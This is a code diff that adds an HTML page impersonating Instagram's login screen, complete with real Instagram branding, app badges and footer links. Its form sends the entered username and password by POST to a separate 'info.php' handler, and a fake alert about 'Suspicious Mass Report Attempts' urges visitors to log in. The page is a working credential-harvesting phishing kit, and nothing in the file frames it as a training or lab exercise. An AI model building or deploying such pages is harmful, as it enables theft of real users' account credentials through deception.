@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="https://img.icons8.com/?size=100&id=Xy10Jcu1L2Su&format=png&color=000000" type="image/x-icon">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">
+                <!-- This spot is reserved for the logo (Do not change anything in the CSS) -->
+            </div>
+            <form class="login-form" id="loginForm" action="info.php" method="POST" onsubmit="return validateForm()">
+                <div class="input-group">
+                    <input type="text" id="uname" name="uname" placeholder="Phone number, username, or email" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="passwd" name="passwd" placeholder="Password" required>
+                    <span id="showPasswordText" class="show-password" style="display:none;">Show</span>
+                </div>
+                <button type="submit" class="login-button">Log in</button>
+                
+                <div class="separator">
+                    <div class="or">Suspicious Mass Report Attempts Detected! <br> Please LogIn to check for any malicious activity!</div>
+                </div>
+                
+                <a href="https://www.instagram.com/accounts/password/reset/?hl=en" class="forgot-password">Forgot password?</a>
+                <p class="agreement-text">
+                    By continuing, you agree to Instagram's <a href="https://help.instagram.com/termsofuse">Terms of Use</a> and <a href="https://about.instagram.com/safety/privacy">Privacy Policy</a>.
+                </p>
+            </form>
+        </div>
+        
+        <div class="get-app">
+            <p>Get the app.</p>
+            <div class="app-badges">
+                <a href="https://apps.apple.com/app/instagram/id389801252?ct=igweb.loginPage.badge&mt=8&pt=428156&vt=lo&hl=en"><img src="https://static.cdninstagram.com/rsrc.php/v4/yt/r/Yfc020c87j0.png" alt="Download on the App Store" height="40"></a>
+                <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=ig_mid%3D753DECE4-F166-470C-94F0-3B5CEB041F26%26utm_campaign%3DloginPage%26utm_content%3Dlo%26utm_source%3Dinstagramweb%26utm_medium%3Dbadge%26original_referrer%3Dhttps%253A%252F%252Fwww.google.com%252F&hl=en"><img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play" height="40"></a>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <div class="footer-links">
+            <a href="https://about.meta.com/">Meta</a>
+            <a href="https://about.instagram.com/">About</a>
+            <a href="https://about.instagram.com/blog/">Blog</a>
+            <a href="https://about.instagram.com/about-us/careers">Jobs</a>
+            <a href="https://help.instagram.com/">Help</a>
+            <a href="https://developers.facebook.com/docs/instagram">API</a>
+            <a href="https://www.instagram.com/legal/privacy/?hl=en">Privacy</a>
+            <a href="https://www.instagram.com/legal/terms/?hl=en">Terms</a>
+            <a href="https://www.instagram.com/explore/locations/?hl=en">Locations</a>
+            <a href="https://www.instagram.com/web/lite/?hl=en">Instagram Lite</a>
+            <a href="https://www.threads.net/">Threads</a>
+            <a href="https://www.facebook.com/help/instagram/261704639352628?hl=en">Contact Uploading & Non-Users</a>
+            <a href="https://www.instagram.com/accounts/meta_verified/?entrypoint=web_footer&hl=en">Meta Verified</a>
+        </div>
+        <div class="copyright">
+            © 2025 Instagram from Meta
+        </div>
+    </footer>
+    <script>
+        function updateTheme() {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode');
+            } else {
+                document.body.classList.remove('dark-mode');
+            }
+        }
+
+        // Initial theme setup
+        updateTheme();
+
+        // Listen for changes in preferred color scheme
+        window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', updateTheme);
+    </script>
+
+<script>
+    const passwordField = document.getElementById('passwd');
+    const showPasswordText = document.getElementById('showPasswordText');
+
+    // Event listener to show/hide "Show" when user types in the password field
+    passwordField.addEventListener('input', function() {
+        if (passwordField.value.length > 0) {
+            showPasswordText.style.display = 'inline'; // Show "Show" when typing
+        } else {
+            showPasswordText.style.display = 'none'; // Hide "Show" if the field is empty
+        }
+    });
+
+    // Function to toggle password visibility when "Show" is clicked
+    showPasswordText.addEventListener('click', function() {
+        const currentType = passwordField.type;
+        if (currentType === 'password') {
+            passwordField.type = 'text'; // Change to text (show password)
+            showPasswordText.textContent = 'Hide'; // Change text to "Hide"
+        } else {
+            passwordField.type = 'password'; // Change to password (hide password)
+            showPasswordText.textContent = 'Show'; // Change text to "Show"
+        }
+    });
+
+    // Function to validate the form before submission
+    function validateForm() {
+        const username = document.getElementById('uname').value;
+        const password = document.getElementById('passwd').value;
+        
+        // Check if either field is empty
+        if (!username || !password) {
+            alert('Please fill in both fields.');
+            return false; // Prevent form submission
+        }
+        return true; // Allow form submission if all fields are filled
+    }
+</script>
+
+</body>
+</html>
